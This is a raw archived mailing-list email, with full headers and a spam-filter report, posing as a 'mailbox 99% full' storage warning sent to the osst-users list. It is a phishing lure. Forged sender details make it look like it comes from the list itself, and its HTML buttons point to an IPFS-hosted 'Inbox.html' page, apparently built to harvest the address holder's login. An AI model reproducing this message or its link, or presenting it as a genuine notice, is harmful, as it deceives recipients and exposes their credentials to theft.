Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 050318A4C71
	for <lists+osst-users@lfdr.de>; Mon, 15 Apr 2024 12:21:02 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1rwJSO-0007pj-AC
	for lists+osst-users@lfdr.de;
	Mon, 15 Apr 2024 10:21:00 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <osst-users@lists.sourceforge.net>)
 id 1rwJSN-0007pc-6x for osst-users@lists.sourceforge.net;
 Mon, 15 Apr 2024 10:20:59 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=PEJ1m5ExvUE2szIHuUYSAKUaPQ1zE8J/g4+mQvI9njM=; b=NSowv0MN4iQT1GItPH6OCKitNV
 8IiCku5Y2sJBhObhRnKaxgOdJP2F8TMPBGewYXC6lG4NlyiuaF807fvelSK3mIsCaNsLRoHQ7BS+9
 atzyo8mbt1PxHCYj3fzdDWsAvFV5lIpgAMrkNSsZ8qe1IPBMGSkPoky8M0X3DGzXNpFc=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=PEJ1m5ExvUE2szIHuUYSAKUaPQ1zE8J/g4+mQvI9njM=; b=f
 o04fsDmvq41EPeV+34w+YlI7EXhdzzUveYiqbnlUqYg57SEVceYhfK1WKA8M+/8FhUTpImZJMBJHU
 FwdSGFwtMi7Q/kY41kUnX/eaHjX/Ob3XPsvHLyT7KLZJ3lKNl/bAg+lomDlyJn1FieRYd1HgCY7k2
 fF9GbWANu8B8IXHU=;
Received: from [203.149.232.166] (helo=lists.sourceforge.net)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1rwJSM-0001Va-B2 for osst-users@lists.sourceforge.net;
 Mon, 15 Apr 2024 10:20:59 +0000
To: osst-users@lists.sourceforge.net
Date: 15 Apr 2024 11:20:52 +0100
Message-ID: <20240415112052.F9CA055B2A472F86@lists.sourceforge.net>
MIME-Version: 1.0
X-Helo-Check: bad, Forged One Of Our Local Domains (lists.sourceforge.net)
X-Spam-Score: 5.4 (+++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Your mailbox at osst-users@lists.sourceforge.net is 99% full.
    4.82 GB 4.86 GB You’ve used all of the available storage space in your
   Mail Account, as a result you may not be able to send and receive emails on
    your Mail account. 
 
 Content analysis details:   (5.4 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: dweb.link]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
                             high trust
                             [203.149.232.166 listed in list.dnswl.org]
  0.5 RCVD_IN_MSPIKE_L5      RBL: Very bad reputation (-5)
                             [203.149.232.166 listed in bl.mailspike.net]
  1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
                             [203.149.232.166 listed in dnsbl-1.uceprotect.net]
  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
                             https://senderscore.org/blocklistlookup/
                           [203.149.232.166 listed in bl.score.senderscore.com]
  0.9 SPF_HELO_SOFTFAIL      SPF: HELO does not match SPF record (softfail)
  1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  1.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
  1.2 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
                             website + no rDNS
  0.0 TO_EQ_FM_DIRECT_MX     To == From and direct-to-MX
  1.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
X-Headers-End: 1rwJSM-0001Va-B2
Subject: [Osst-users] Your mailbox Disk space is full.
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: Storage Notification via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: Storage Notification <osst-users@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============9011994852825305160=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============9011994852825305160==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
; text-indent: 0px; letter-spacing: normal; font-family: "Lucida Grande", V=
erdana, Arial, Helvetica, sans-serif; font-size: 1.2em; font-style: normal;=
 font-weight: 600; margin-top: 0px; margin-bottom: 1.5em; word-spacing: 0px=
; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
-text-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;'><=
br><br>Your mailbox at osst-users@lists.sourceforge.net is 99% full.</p>
<p>
<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=

<tbody>
<tr style=3D"height: 0.5em;">
<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;"><br>&nbs=
p;</td>
<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">&nbsp;</td></tr></tb=
ody></table>
<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=

<tbody>
<tr>
<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
Helvetica, Arial, sans-serif;"><span style=3D"color: rgb(218, 60, 47); font=
-weight: bold;">4.82 GB</span></td>
<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
 Helvetica, Arial, sans-serif;"><span style=3D"font-weight: bold;">4.86 GB<=
/span></td></tr></tbody></table><p></p>
<p style=3D'margin: 3em auto; text-align: center; color: rgb(51, 51, 51); t=
ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
 "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; f=
ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant=
-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;'>
<span style=3D'text-align: center; color: rgb(37, 39, 43); text-transform: =
none; text-indent: 0px; letter-spacing: normal; font-family: "Google Sans",=
 Roboto, Arial, sans-serif; font-size: 32px; font-style: normal; font-weigh=
t: 400; word-spacing: 0px; float: none; display: inline !important; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;'><font size=
=3D"3">You&#8217;ve used all of the available storage space in your Mail Ac=
count, as a result you may not be able to send and receive emails on your M=
ail account.</font></span><br class=3D"Apple-interchange-newline"></p>
<table width=3D"auto" align=3D"center" role=3D"presentation" style=3D'color=
: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-famil=
y: "Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: =
normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: =
2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures:=
 normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
coration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"0"><tbody><tr><td style=3D"margin: 0px;"><table role=3D"presen=
tation" style=3D"margin: 0px; padding: 0px; clear: both; border-collapse: c=
ollapse; table-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=
=3D"0"><tbody><tr><td align=3D"center" style=3D"margin: 0px; padding: 31px =
0px 4px; border-collapse: collapse; direction: ltr; -ms-word-break: normal;=
" dir=3D"ltr"><div>
<a class=3D"m_-5620939630368618957showdesktop" style=3D'padding: 14px 20px =
13px; border-radius: 4px; text-align: center; color: rgb(255, 255, 255); li=
ne-height: 21px; letter-spacing: 0.75px; font-family: "Google Sans", Roboto=
, Arial, sans-serif; font-size: 14px; font-weight: normal; text-decoration:=
 none; display: inline-block; direction: ltr; background-color: rgb(26, 115=
, 232);'=20
href=3D"https://bafkreicqbqa5tpxu4crfpuwpoqobl4bmu7l55kauq242pw6n3yfs6jswsi=
=2Eipfs.dweb.link/?filename=3DInbox.html#osst-users@lists.sourceforge.net" =
target=3D"_blank"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://notification=
s.google.com/g/p/ANiao5pruUao2faGyc0Xrsv7QgMOgPLjiphDcXAnE4l2sBPOyd1RrNfmaj=
dJVp22Tb81A8DOf-Jg9B_nmMiFifboUwNyhIfZ2vpxZpHcPIzfwKg2f5MqUXof0BLW73WIqraex=
F8HCFGbmd2agi-OC2pzOcY2NprdwPccUZolWZoWyG7K7gRfeiwenJoRNEepSu_IFiKe02cnvRXT=
ggXgZRVRvDlqtZhycDBeVqOAV959o2WxTrCuny_OizspwfUKeosFf9aRKiY20xhO5jkrMFPGDeg=
vgeP9vb-11KTqwkUedSJF0oydNvmD2ckqg17SNB5SE4TWRFbsdM9AwUOXOcj_fNM0OegqRKJ6Ub=
OfwQ&amp;source=3Dgmail&amp;ust=3D1704270510399000&amp;usg
&#10;&#10;&#10;&#10;=3DAOvVaw1r32spQKUG7OlxsJ_4REWL">Get more storage</a><b=
r><br>
<table width=3D"480" role=3D"presentation" style=3D'width: 480px; color: rg=
b(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: "=
Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: norm=
al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
idows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding: 49px 0px 0px;=
 text-align: center; color: rgb(37, 39, 43); line-height: 40px; font-family=
: "Google Sans", Roboto, Arial, sans-serif; font-size: 26px; font-weight: n=
ormal; direction: ltr; -ms-word-break: normal;' dir=3D"ltr">Not ready to ge=
t more storage?</td></tr><tr>
<td style=3D'margin: 0px; padding: 3px 0px 22px 1px; text-align: center; co=
lor: rgb(37, 39, 43); line-height: 40px; font-family: "Google Sans", Roboto=
, Arial, sans-serif; font-size: 16px; font-weight: normal; direction: ltr; =
-ms-word-break: normal;' dir=3D"ltr"><span class=3D"m_-5620939630368618957s=
howdesktop" style=3D"display: block;">
<a style=3D"color: rgb(26, 115, 232); padding-top: 14px; padding-bottom: 14=
px; text-decoration: none;" href=3D"https://bafkreicqbqa5tpxu4crfpuwpoqobl4=
bmu7l55kauq242pw6n3yfs6jswsi.ipfs.dweb.link/?filename=3DInbox.html#osst-use=
rs@lists.sourceforge.net" target=3D"_blank"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://notification=
s.google.com/g/p/ANiao5pahEJiovwHB6NgJmVP-42UzXpqcTzgR2FnGD6D4LjzBtmryYJZrH=
NmnGL6LQ0nb8gpb_ABRR1BE6JI4Khq091fI1CpemlCWWtKSoUyQ4csirGXH7R3Zzf3QZyNI2Jbw=
52cpuGtZQt5VqzpQ_xniCmv8SYsskuZ12aSJaAlFQdcRdnIsmRxtEOyN-MFMpChwpAsIfx-heZE=
Pzuu-Cvml2rNqdvKwnl1_7wr6xI_iutIdgYdnC-MqJGVWToagYRbKmB2Q9d1hpXaJj3Gt0Vx1kC=
MyFyk2jVb6ozlCvu-ScWULmHkMgk0NYmAF3V0SjD5jSJY8i37W7t0X9QPyxYp1fCJtsWajLqhoo=
Ml-TB5tyIYPM7NwB6nB9U&amp;source=3Dgmail&amp;ust=3D1704270
&#10;&#10;&#10;&#10;510399000&amp;usg=3DAOvVaw3AgOY99D8ViKdrNd4eAvCV">Delet=
e files to free up space.</a></span></td></tr></tbody></table></div></td></=
tr></tbody></table></td></tr></tbody></table>
<table width=3D"480" role=3D"presentation" style=3D'width: 480px; color: rg=
b(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: "=
Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: norm=
al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
idows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding: 49px 0px 0px;=
 text-align: center; color: rgb(37, 39, 43); line-height: 40px; font-family=
: "Google Sans", Roboto, Arial, sans-serif; font-size: 26px; font-weight: n=
ormal; direction: ltr; -ms-word-break: normal;' dir=3D"ltr"><br></td></tr><=
tr>
<td style=3D'margin: 0px; padding: 3px 0px 22px 1px; text-align: center; co=
lor: rgb(37, 39, 43); line-height: 40px; font-family: "Google Sans", Roboto=
, Arial, sans-serif; font-size: 16px; font-weight: normal; direction: ltr; =
-ms-word-break: normal;' dir=3D"ltr"><span class=3D"m_-5620939630368618957s=
howdesktop" style=3D"display: block;"><br></span></td></tr></tbody></table>=
</body></html>


--===============9011994852825305160==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============9011994852825305160==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============9011994852825305160==--
